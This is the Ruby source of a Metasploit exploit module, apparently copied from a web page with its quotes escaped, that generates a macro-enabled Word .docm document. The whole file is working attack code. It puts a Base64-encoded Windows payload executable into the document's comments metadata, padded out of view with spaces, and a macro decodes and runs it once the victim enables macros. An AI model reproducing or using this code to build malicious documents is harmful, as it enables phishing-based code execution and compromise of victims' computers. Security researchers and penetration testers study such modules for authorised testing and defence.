# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex/zip&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Office Word Malicious Macro Execution",
      &#039;Description&#039;    => %q{
        This module generates a macro-enabled Microsoft Office Word document. The comments
        metadata in the data is injected with a Base64 encoded payload, which will be
        decoded by the macro and execute as a Windows executable.

        For a successful attack, the victim is required to manually enable macro execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;sinn3r&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://en.wikipedia.org/wiki/Macro_virus&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;DisablePayloadHandler&#039; => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Microsoft Office Word&#039;, {}],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jan 10 2012",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      OptString.new("BODY", [false, &#039;The message for the document body&#039;, &#039;&#039;]),
      OptString.new(&#039;FILENAME&#039;, [true, &#039;The Office document macro file&#039;, &#039;msf.docm&#039;])
    ], self.class)
  end


  def on_file_read(short_fname, full_fname)
    buf = File.read(full_fname)

    case short_fname
    when /document\.xml/
      buf.gsub!(/DOCBODYGOESHER/, datastore[&#039;BODY&#039;])
    when /core\.xml/
      b64_payload = &#039; &#039; * 55
      b64_payload << Rex::Text.encode_base64(generate_payload_exe)
      buf.gsub!(/PAYLOADGOESHERE/, b64_payload)
    end

    # The original filename of __rels is actually ".rels".
    # But for some reason if that&#039;s our original filename, it won&#039;t be included
    # in the archive. So this hacks around that.
    case short_fname
    when /__rels/
      short_fname.gsub!(/\_\_rels/, &#039;.rels&#039;)
    end

    yield short_fname, buf
  end


  def package_docm(path)
    zip = Rex::Zip::Archive.new

    Dir["#{path}/**/**"].each do |file|
      p = file.sub(path+&#039;/&#039;,&#039;&#039;)

      if File.directory?(file)
        print_status("Packaging directory: #{file}")
        zip.add_file(p)
      else
        on_file_read(p, file) do |fname, buf|
          print_status("Packaging file: #{fname}")
          zip.add_file(fname, buf)
        end
      end
    end

    zip.pack
  end


  def exploit
    print_status(&#039;Generating our docm file...&#039;)
    path  = File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;office_word_macro&#039;)
    docm = package_docm(path)
    file_create(docm)
    super
  end

end

